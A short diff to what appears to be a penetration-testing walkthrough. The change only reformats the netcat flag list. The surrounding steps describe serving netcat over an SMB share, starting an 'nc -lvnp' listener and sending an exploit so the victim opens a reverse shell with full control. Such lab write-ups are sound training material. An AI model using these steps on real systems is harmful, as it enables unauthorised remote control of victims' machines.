@@ -21,9 +21,9 @@ As you're on a powershell, this command tells windows to open a cmd and run the 
 	-smb2support : It's used if you want to make your server smb2 supportive
 
 9. Start the local server the victim's machine will try to connect when executes the command with the netcat previously downloaded from the network share. Usage: "nc -lvnp __{PORT}__"
-    -l : Set the port to a listen state
-    -v : Verbose 
-    -n : Don't apply dns resolution
-    -p : Port:
+- -l : Set the port to a listen state
+- -v : Verbose 
+- -n : Don't apply dns resolution
+- -p : Port:
 
 10. Send the exploit to the machine and recieve full control in the netcat listening service previously set.
